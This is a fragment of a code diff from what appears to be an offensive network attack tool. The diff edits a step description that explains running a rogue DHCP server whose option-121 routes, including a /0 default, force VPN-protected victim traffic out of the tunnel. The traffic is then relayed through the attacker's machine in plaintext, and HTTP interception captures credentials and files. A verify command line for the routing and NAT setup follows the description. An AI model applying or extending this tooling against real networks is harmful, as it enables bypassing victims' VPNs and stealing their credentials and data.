@@ -712,14 +712,13 @@ def main():
             "Enable IP forwarding and configure iptables MASQUERADE and a "
             "policy routing table so all forwarded victim traffic passes "
             "through this machine. The rogue DHCP server will deliver "
-            "option-121 classless static routes alongside option 3, "
+            "option-121 classless static routes (including a /0 default), "
             "forcing VPN-protected traffic to bypass the tunnel and "
             "transit this host in plaintext. HTTP interception then "
             "starts immediately after to capture credentials and files "
             "from the resulting plaintext traffic.",
             verify="ip rule show   |   ip route show table 100   |   iptables -t nat -L -n -v   |   ip link show tun0",
         )
-        # Pass pre-detected tun/subnet so enable_vpn_relay skips re-detection.
         tun_iface = vpn_relay.enable_vpn_relay(
             server_details, ospf_interface,
             tun=pre_tun, vpn_net24=pre_vpn_net24,
